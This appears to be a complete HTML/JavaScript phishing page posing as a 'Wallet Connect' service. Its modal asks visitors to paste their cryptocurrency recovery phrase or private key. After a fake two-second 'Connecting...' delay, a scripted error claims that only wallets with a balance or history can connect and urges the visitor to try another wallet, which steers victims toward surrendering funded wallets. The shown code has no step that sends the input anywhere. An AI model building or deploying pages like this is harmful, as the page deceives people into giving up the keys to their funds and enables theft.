<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wallet Connect</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      overflow-x: hidden;
    }

    header, footer {
      background: #222;
      color: #fff;
      text-align: center;
      padding: 1em;
    }

    main {
      padding: 2em;
      text-align: center;
    }

    .btn {
      background: #0066ff;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 1rem;
    }

    .wallet-page {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(255, 255, 255, 0.97);
      z-index: 1000;
      padding: 2em;
      box-sizing: border-box;
    }

    .wallet-page.active {
      display: block;
    }

    .wallet-close {
      position: absolute;
      top: 10px;
      right: 15px;
      font-size: 1.5rem;
      font-weight: bold;
      color: #333;
      cursor: pointer;
    }

    .wallet-close:hover {
      color: red;
    }

    .wallet-form {
      max-width: 400px;
      margin: 3em auto;
      text-align: left;
    }

    .wallet-form input {
      width: 100%;
      padding: 12px;
      margin: 0.5em 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    #error-box {
      display: none;
      background: #ffe6e6;
      border: 1px solid #cc0000;
      color: #cc0000;
      font-size: 0.85rem;
      font-weight: 500;
      text-align: center;
      padding: 10px;
      border-radius: 6px;
      margin-top: 10px;
      animation: fadeIn 0.5s ease-in-out;
    }

    .blurred {
      filter: blur(5px);
    }

    .noscroll {
      overflow: hidden;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to   { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <header>
    <h1>Connect Your Wallet</h1>
  </header>

  <main id="main-content">
    <p>To continue, please connect your wallet.</p>
    <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
  </main>

  <div class="wallet-page" id="wallet-page">
    <span class="wallet-close" onclick="closeWalletPage()">Ã—</span>
    <form id="wallet-form" class="wallet-form">
      <h2>Wallet Connect</h2>
      <p>Please paste your wallet recovery phrase or private key below to connect.</p>
      <textarea id="wallet-input" rows="4" placeholder="Enter phrase or key here..." required></textarea>
      <div id="error-box"></div>
      <button class="btn" id="submit-btn" type="submit">Connect</button>
    </form>
  </div>

  <footer>
    <p>&copy; 2025 Wallet Connect</p>
  </footer>

  <script>
    function showWalletPage() {
      document.getElementById('wallet-page').classList.add('active');
      document.getElementById('main-content').classList.add('blurred');
      document.querySelector('header').classList.add('blurred');
      document.querySelector('footer').classList.add('blurred');
      document.body.classList.add('noscroll');
    }

    function closeWalletPage() {
      document.getElementById('wallet-page').classList.remove('active');
      document.getElementById('main-content').classList.remove('blurred');
      document.querySelector('header').classList.remove('blurred');
      document.querySelector('footer').classList.remove('blurred');
      document.body.classList.remove('noscroll');
      document.getElementById("error-box").style.display = "none";
    }

    document.getElementById("wallet-form").addEventListener("submit", function (e) {
      e.preventDefault();
      const btn = document.getElementById("submit-btn");
      const input = document.getElementById("wallet-input").value.trim();
      const errorBox = document.getElementById("error-box");

      if (!input) {
        errorBox.textContent = "Please enter your phrase or private key.";
        errorBox.style.display = "block";
        return;
      }

      btn.disabled = true;
      btn.textContent = "Connecting...";

      setTimeout(() => {
        errorBox.textContent = "Wallet could not connect to server. Only wallets with a balance or transaction history can be connected. Please try again with another wallet.";
        errorBox.style.display = "block";
        btn.disabled = false;
        btn.textContent = "Connect";
      }, 2000);
    });
  </script>
</body>
</html>
